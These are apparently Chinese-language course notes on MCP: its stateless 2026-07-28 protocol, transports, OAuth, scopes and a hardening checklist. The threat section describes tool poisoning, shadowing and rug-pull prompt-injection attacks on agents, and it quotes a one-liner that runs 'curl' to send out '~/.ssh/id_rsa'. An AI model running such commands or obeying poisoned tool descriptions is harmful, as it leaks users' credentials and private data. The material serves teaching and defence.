MCP、插件与连接器

AgentOS 的设备驱动总线：Model Context Protocol 承载什么， 无状态的 2026-07-28 版本在线路上如何工作，远程服务器如何获得授权， 连接器如何分发，以及 MCP 服务器如何遭到攻击与防御。

原语无状态核心传输层OAuth注册表工具投毒

操作系统类比MCP 是驱动总线；连接器是可安装的驱动

经典操作系统采用 MCP 的 AgentOS

各原语由谁控制

  • 工具（Tools）：由模型控制的操作（tools/list、tools/call）。
  • 资源（Resources）：由应用控制、按 URI 寻址的数据（resources/read）。
  • 提示（Prompts）：由用户控制的模板，常以斜杠命令呈现（prompts/get）。
  • 服务器 → 用户：elicitation（表单或 URL）。Sampling、roots 和 logging 自 2026-07-28 起已弃用。

变化2026-07-28：MCP 变为无状态

2025-11-25 及更早2026-07-28
对话的开始initialize → notifications/initialized无。可选的 server/discover（服务器 MUST 实现）
版本与能力每个连接协商一次在每个请求的 _meta 中发送（io.modelcontextprotocol/protocolVersion、…/clientCapabilities）
会话Mcp-Session-Id 头已移除；状态存放在作为工具参数传递的显式句柄中
服务器向客户端提问服务器发起的 elicitation/create、sampling/createMessage多轮往返请求：结果为 resultType: "input_required"，客户端重试
变更通知HTTP GET 流、resources/subscribe单一的 subscriptions/listen 流，按类型选择开启
长时间运行的工作核心中的实验性任务io.modelcontextprotocol/tasks 扩展（tasks/get、tasks/update）

对运维人员的意义：任何请求都可以落到轮询负载均衡器后面的任一副本上，无需粘性会话，也无需共享会话存储。被弃用的特性至少还能继续使用 12 个月。

线路上基于 Streamable HTTP 的一次自包含工具调用

POST /mcp HTTP/1.1
MCP-Protocol-Version: 2026-07-28
Mcp-Method: tools/call
Mcp-Name: search
Authorization: Bearer eyJ...
Content-Type: application/json

{"jsonrpc": "2.0", "id": 7,
 "method": "tools/call",
 "params": {
   "name": "search",
   "arguments": {"q": "kv cache"},
   "_meta": {
     "io.modelcontextprotocol/protocolVersion": "2026-07-28",
     "io.modelcontextprotocol/clientInfo": {...},
     "io.modelcontextprotocol/clientCapabilities": {...}}}}

→ {"result": {"resultType": "complete",
     "content": [...], "isError": false}}

像系统管理员一样阅读

  • POST 必须带有 Mcp-Method 和 Mcp-Name，因此网关和 WAF 无需解析请求体即可路由、限速和计量（SEP-2243）。
  • 工具可通过 x-mcp-header 把基本类型参数镜像到 Mcp-Param-* 头中；切勿用这种方式标记机密信息。
  • 每个结果都带 resultType；缺少该字段的旧服务器结果视为 "complete"。
  • 版本错误 → UnsupportedProtocolVersionError。
  • 追踪上下文通过 _meta（traceparent）传递，与可观测性讲义相衔接。
modelcontextprotocol.io/specification/2026-07-28/server/tools; …/basic/transports/streamable-http; 变更日志次要变更 2 和 4。

传输层本地驱动用 stdio，远程驱动用 Streamable HTTP

stdio

  • 客户端把服务器作为子进程启动；通过 stdin/stdout 传输以换行分隔的 JSON-RPC。
  • stderr 用于日志（取代已弃用的 Logging 特性）。
  • 没有 OAuth：凭据来自环境变量，因此由框架决定子进程能看到哪些环境变量。
  • 以用户权限运行，除非框架对其进行沙箱隔离。

Streamable HTTP

  • 单一端点；响应为普通 JSON，或用于进度的 SSE 流。
  • 自 2026-07-28 起不再支持断点续传：流中断会丢失请求，因此客户端用新的 id 重新发出。
  • 校验 Origin（DNS 重绑定），本地服务器绑定到 localhost，对每个请求进行认证。
  • 旧的 HTTP+SSE 传输（2024-11-05）已被正式标记为 Deprecated。

经验法则：驱动需要本地机器（文件、IDE、VPN）时用 stdio；多个用户共享同一服务、并希望集中更新和使用 OAuth 时用 HTTP。

modelcontextprotocol.io/specification/2026-07-28/basic/transports; 变更日志重大变更 9 和弃用项 2。

询问用户多轮往返请求取代服务器发起的调用

// 1. client → tools/call {"name": "deploy", ...}
// 2. server answers with an interim result
{"resultType": "input_required",
 "inputRequests": {
   "confirm": {"method": "elicitation/create",
     "params": {"mode": "form",
       "message": "Deploy to prod?",
       "requestedSchema": {...}}}},
 "requestState": "eyJ..."}

// 3. client asks the user, then retries
//    with a NEW JSON-RPC id
{"method": "tools/call",
 "params": {"name": "deploy", ...,
   "inputResponses": {
     "confirm": {"action": "accept",
                 "content": {...}}},
   "requestState": "eyJ..."}}

设计上的影响

  • 服务器提问无需保持打开的流；任何副本都可以处理重试。
  • requestState 是由客户端携带的不透明服务器状态；应像对待 cookie 一样对待它（签名或加密）。
  • URL 模式的 elicitation 会把用户带到浏览器页面（OAuth、支付），使机密信息不会经过模型。
  • 内核视角：这是一个返回 EAGAIN 并附带延续（continuation）的系统调用，而不是向用户空间的 upcall。
modelcontextprotocol.io/specification/2026-07-28/basic/patterns/mrtr; 变更日志 SEP-2322 和次要变更 11。

上下文平面资源、提示与可缓存的列表

资源与提示

  • 资源是按 URI 寻址的数据（file://、git://、自定义 scheme）；由宿主决定哪些内容进入上下文。
  • 工具可以返回 resource_link，而不是内联一大块数据：这是一个指针，类似 mmap。
  • 提示是用户挑选的模板；宿主把它们渲染为斜杠命令。
  • 有状态服务器返回显式句柄（例如 basket_id），并在每次调用时检查授权。

缓存（SEP-2549）

  • tools/list、prompts/list、resources/list、resources/read 携带 ttlMs 和 cacheScope（public / private）。
  • 服务器 SHOULD 以确定的顺序返回工具。
  • 原因：工具定义位于提示的最前面。稳定、有序的工具列表能让提供商的提示缓存（以及你的 KV 缓存）保持热状态。
modelcontextprotocol.io/specification/2026-07-28/server/resources, …/server/prompts, …/server/utilities/caching；前缀缓存见 KV 缓存讲义。

授权远程 MCP 服务器是 OAuth 2.1 资源服务器

  1. 客户端不带令牌调用 → 401，附带 WWW-Authenticate: Bearer resource_metadata="…"，通常还带 scope。
  2. 客户端读取受保护资源元数据（RFC 9728）以找到授权服务器。
  3. 客户端读取 AS 元数据（RFC 8414 或 OpenID Connect Discovery；客户端 MUST 同时支持两者）。
  4. 客户端获得客户端 ID：Client ID Metadata Document（以 HTTPS URL 作为 client_id）、预先注册，或动态客户端注册（现已弃用）。
  5. 授权码 + PKCE，两次请求中都带上 resource=<canonical server URI>（RFC 8707）。
  6. 客户端在兑换授权码之前，先将响应中的 iss 与记录的签发者进行核对（RFC 9207）。
  7. 每个请求都携带 Authorization: Bearer；服务器检查令牌的受众（audience）是自己。

学生常犯的错误

  • stdio 服务器 SHOULD NOT 使用此流程；它们从环境变量读取凭据。
  • 令牌绝不能放在查询字符串中。
  • 凭据绑定于签发它们的签发者；签发者变化时需重新注册（SEP-2352）。
  • 桌面和 CLI 客户端声明 application_type，使 localhost 重定向可用（SEP-837）。
modelcontextprotocol.io/specification/2026-07-28/basic/authorization.

最小权限作用域、升级授权，以及两种被禁止的模式

渐进式作用域

  • 从最小的作用域集合开始；scopes_supported 应当是最小集，而不是完整目录。
  • 在特权调用时，服务器返回 403 error="insufficient_scope", scope="files:write"，所有需要的作用域放在同一个质询中。
  • 客户端以新旧作用域的并集重新授权，最多重试几次，然后放弃。
  • 避免通配作用域（*、full-access）。

绝不允许

  • 令牌透传（Token passthrough）：服务器 MUST NOT 接受并非签发给自己的令牌，也不得把客户端的令牌转发给下游。这会破坏审计、限速和受众检查。
  • 混淆代理人（Confused deputy）：使用静态上游客户端 ID、DCR 和同意 cookie 的代理，会让攻击者绕过同意环节。代理 MUST 保持按客户端的同意、精确的 redirect_uri 匹配以及一次性的 state。
MCP 授权（作用域质询处理）与安全最佳实践：modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices.

威胁MCP 服务器如何遭到攻击

通过模型

  • 工具投毒（Tool poisoning）（Invariant Labs，2025 年 4 月）：工具描述中的隐藏指令使 Cursor 读取 ~/.cursor/mcp.json 和 SSH 密钥，并将其放在参数中传出。
  • 影子攻击（Shadowing）：一个服务器的描述改写了受信任服务器的工具（所有邮件都发给攻击者）。
  • 撤地毯（Rug pull）：描述在用户批准之后被更改。
  • 有毒的智能体流（Toxic agent flow）（2025 年 5 月）：一个公开的 GitHub issue 使智能体把私有仓库的数据复制到公开 PR 中。没有可修补的服务器漏洞。
  • MCPTox（2508.14925）：45 个真实服务器、353 个工具、20 个智能体；攻击成功率最高达 72.8%，拒绝率低于 3%。能力更强的模型往往更容易受影响。

绕过模型

  • 本地服务器被攻陷：一键配置运行 npx evil && curl -d @~/.ssh/id_rsa …。
  • SSRF：恶意服务器把 OAuth 元数据指向 169.254.169.254 或 localhost。
  • 授权 URL 注入：javascript: URL，或经由 shell 打开的 URL。
  • 会话劫持（较旧的有状态服务器）：猜出会话 ID 后注入事件。
invariantlabs.ai/blog/mcp-security-notification; invariantlabs.ai/blog/mcp-github-vulnerability; arxiv.org/abs/2508.14925; MCP 安全最佳实践。

防御启用 MCP 的框架加固清单

客户端 / 宿主

  • 添加本地服务器之前显示完整命令；在沙箱中、以过滤后的环境变量运行。
  • 对服务器和工具使用允许列表（include / enabled_tools）；按服务器给名称加前缀。
  • 锁定版本并对工具描述做哈希；描述变化时重新提示。
  • 把注解和工具输出视为不可信；应用访问控制讲义中的“二法则”（Rule of Two）。
  • 在 OAuth 发现阶段拦截私有 IP 段和非 HTTPS URL；打开 URL 时不经过 shell。

服务器

  • 校验受众；绝不透传令牌。
  • 最小作用域并配合升级授权；记录权限提升。
  • 校验 Origin；本地 HTTP 绑定到 localhost，或使用 stdio。
  • 校验输入、限速、净化输出；返回模型可据以行动的 isError 结果。
  • 不透明、高熵的句柄；每次调用都进行授权。
MCP 安全最佳实践；MCP 2026-07-28 Tools（安全注意事项）；Meta “Agents Rule of Two”（见访问控制讲义）。

练习构建、挂载、攻击并加固一个 MCP 服务器

  1. 用支持 2026-07-28 的 SDK 编写一个带两个工具（search_notes、send_note）的小型服务器；同时通过 stdio 和 Streamable HTTP 提供服务。
  2. 在两个框架中挂载它（Hermes mcp_servers、Codex [mcp_servers]），并设置工具过滤。
  3. 让 send_note 通过 input_required 结果请求确认。
  4. 在第二个服务器中加入被投毒的描述，观察智能体是否会泄露一条笔记。
  5. 每次只开启一项防御，并重新测量。

报告

  • 工具定义占用的上下文 token
  • 通过 HTTP 时每次调用的请求数（有无 server/discover 的对比）
  • 每种防御下的攻击成功率
  • 各防御分别落在服务器、宿主还是钩子中
